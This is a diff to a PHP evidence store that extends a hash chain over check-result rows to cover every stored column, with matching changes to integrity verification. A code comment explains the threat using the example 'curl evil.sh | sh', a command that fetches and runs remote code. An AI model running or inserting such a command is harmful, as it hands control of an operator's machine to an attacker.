@@ -500,10 +500,10 @@ final class EvidenceStore {
       $check->invocation,
       $check->startedAt,
       $check->durationMs,
-      $now ?? date('c'),
+      $adjudicatedAt = $now ?? date('c'),
       $check->provider,
       $check->measured === NULL ? NULL : (int) $check->measured,
-      $digest = self::chain($previous, $runId, $phase, $attempt, $check),
+      $digest = self::chain($previous, $runId, $phase, $attempt, $check, $adjudicatedAt),
     ]);
     $pdo->prepare('UPDATE run SET chain_head = ?')->execute([$digest]);
     $id = (int) $pdo->lastInsertId();
@@ -1165,7 +1165,28 @@ final class EvidenceStore {
    * @return string
    *   The digest.
    */
-  private static function chain(string $previous, string $runId, string $phase, int $attempt, CheckRecord $check): string {
+  private static function chain(
+    string $previous,
+    string $runId,
+    string $phase,
+    int $attempt,
+    CheckRecord $check,
+    string $adjudicatedAt,
+  ): string {
+    // EVERY stored column, not a chosen subset. The first cut hashed the
+    // verdict fields and left `remedy`, `invocation`, `provider` and the
+    // timestamps outside, which is worse than it sounds:
+    //
+    //   * `remedy` is the command an operator is TOLD TO RUN to clear an
+    //     environment block. Rewriting it to `curl evil.sh | sh` was invisible.
+    //   * `invocation` is what the report prints as the command that ran, and
+    //     it prints it raw, outside the table, explicitly so it can be run.
+    //   * `provider` is a contributed check's attribution, stamped from the
+    //     plugin id precisely so a check cannot claim to be another module's,
+    //     and it could be rewritten to claim exactly that.
+    //
+    // A digest over part of a row invites the question "which part", and the
+    // answer should not be "the part I thought of first".
     return hash('xxh128', implode("\0", [
       $previous,
       $runId,
@@ -1176,9 +1197,14 @@ final class EvidenceStore {
       $check->state->value,
       $check->fault->value,
       $check->summary,
-      $check->exitCode === NULL ? '' : (string) $check->exitCode,
-      $check->durationMs === NULL ? '' : (string) $check->durationMs,
+      $check->remedy ?? '',
       $check->subjectHash ?? '',
+      $check->exitCode === NULL ? '' : (string) $check->exitCode,
+      $check->invocation ?? '',
+      $check->startedAt ?? '',
+      $check->durationMs === NULL ? '' : (string) $check->durationMs,
+      $adjudicatedAt,
+      $check->provider,
       $check->measured === NULL ? '' : ($check->measured ? '1' : '0'),
     ]));
   }
@@ -1195,9 +1221,7 @@ final class EvidenceStore {
    */
   public function integrity(): ?array {
     $statement = $this->connection()->query(
-      'SELECT id, run_id, phase, attempt, kind, name, state, fault, summary,
-              exit_code, duration_ms, subject_hash, measured, row_digest
-         FROM check_result ORDER BY id'
+      'SELECT * FROM check_result ORDER BY id'
     );
     if ($statement === FALSE) {
       return NULL;
@@ -1232,9 +1256,14 @@ final class EvidenceStore {
         self::text($row, 'state'),
         self::text($row, 'fault'),
         self::text($row, 'summary'),
+        self::text($row, 'remedy'),
+        self::text($row, 'subject_hash'),
         ($row['exit_code'] ?? NULL) === NULL ? '' : (string) self::number($row, 'exit_code'),
+        self::text($row, 'invocation'),
+        self::text($row, 'started_at'),
         ($row['duration_ms'] ?? NULL) === NULL ? '' : (string) self::number($row, 'duration_ms'),
-        ($row['subject_hash'] ?? NULL) === NULL ? '' : self::text($row, 'subject_hash'),
+        self::text($row, 'adjudicated_at'),
+        self::text($row, 'provider'),
         ($row['measured'] ?? NULL) === NULL ? '' : (self::number($row, 'measured') === 1 ? '1' : '0'),
       ]));
       if (!hash_equals($expected, $stored)) {
